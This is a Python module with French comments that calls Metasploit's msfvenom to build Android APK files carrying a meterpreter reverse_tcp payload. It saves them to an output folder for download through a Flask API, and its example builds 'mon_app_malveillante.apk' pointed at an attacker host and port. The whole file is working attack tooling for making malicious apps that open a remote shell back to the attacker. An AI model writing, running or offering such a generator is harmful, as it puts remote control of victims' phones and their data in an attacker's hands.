import subprocess
import os
import logging

logger = logging.getLogger(__name__)

# Assurez-vous que le répertoire de sortie existe
# Utilise un répertoire sous 'outputs' pour la cohérence avec le système de téléchargement de l'API Flask
OUTPUT_DIR = os.path.join(os.path.dirname(__file__), '..', 'outputs', 'payloads_android')
os.makedirs(OUTPUT_DIR, exist_ok=True)

def generate_apk_payload(lhost, lport, filename="android_payload.apk", payload_type="android/meterpreter/reverse_tcp"):
    """
    Génère un payload APK Android utilisant msfvenom.

    Args:
        lhost (str): L'adresse IP de l'hôte d'écoute (votre machine attaquante).
        lport (int): Le port d'écoute.
        filename (str): Le nom du fichier APK à générer.
        payload_type (str): Le type de payload msfvenom à utiliser (par défaut: android/meterpreter/reverse_tcp).

    Returns:
        tuple: (bool, str) - True en cas de succès avec le chemin du fichier, False avec un message d'erreur.
    """
    if not lhost or not lport:
        return False, "LHOST et LPORT sont obligatoires."

    output_path = os.path.join(OUTPUT_DIR, filename)

    # Commande msfvenom
    msfvenom_command = [
        "C:\\metasploit-framework\\bin\\msfvenom.bat", # Chemin complet vers msfvenom
        "-p", payload_type,
        "LHOST=" + lhost,
        "LPORT=" + str(lport),
        "-f", "apk",
        "-o", output_path
    ]

    try:
        logger.info(f"Exécution de la commande msfvenom: {' '.join(msfvenom_command)}")
        process = subprocess.run(msfvenom_command, capture_output=True, text=True, check=True)
        
        if os.path.exists(output_path):
            logger.info(f"Payload APK généré avec succès: {output_path}")
            return True, os.path.relpath(output_path, os.path.join(os.path.dirname(__file__), '..'))
        else:
            logger.error(f"msfvenom a terminé mais le fichier APK n'a pas été trouvé. Stderr: {process.stderr}")
            return False, f"Erreur: msfvenom n'a pas créé le fichier APK. {process.stderr}"

    except FileNotFoundError:
        logger.error("Erreur: La commande 'msfvenom' n'a pas été trouvée. Assurez-vous que Metasploit Framework est installé et que 'msfvenom' est dans votre PATH.")
        return False, "Erreur: 'msfvenom' non trouvé. Installez Metasploit Framework."
    except subprocess.CalledProcessError as e:
        logger.error(f"Erreur lors de l'exécution de msfvenom. Stderr: {e.stderr}, Stdout: {e.stdout}")
        return False, f"Erreur msfvenom: {e.stderr}"
    except Exception as e:
        logger.error(f"Une erreur inattendue est survenue lors de la génération de l'APK: {e}")
        return False, f"Erreur inattendue: {e}"

if __name__ == '__main__':
    # Exemple d'utilisation
    # Pour exécuter cet exemple, assurez-vous que msfvenom est installé et dans votre PATH
    # et remplacez les valeurs par vos propres LHOST et LPORT.
    success, message = generate_apk_payload("192.168.1.10", 4444, "mon_app_malveillante.apk")
    if success:
        print(f"Payload créé : {message}")
    else:
        print(f"Échec de la création : {message}")
